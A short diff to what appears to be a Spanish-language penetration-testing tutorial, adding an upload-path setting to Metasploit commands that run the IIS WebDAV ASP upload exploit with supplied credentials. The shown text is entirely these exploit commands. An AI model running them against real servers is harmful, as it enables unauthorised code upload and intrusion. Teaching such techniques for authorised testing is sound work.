@@ -105,6 +105,7 @@ También podemos automatizar todo el proceso:
 msf > use exploit/windows/iis/iis_webdav_upload_asp
 msf exploit(windows/iis/iis_webdav_upload_asp)> set httpusername usr
 msf exploit(windows/iis/iis_webdav_upload_asp)> set httppassword pass
+msf exploit(windows/iis/iis_webdav_upload_asp)> set path /webdav/payload.asp
 msf exploit(windows/iis/iis_webdav_upload_asp)> run
 ```
 
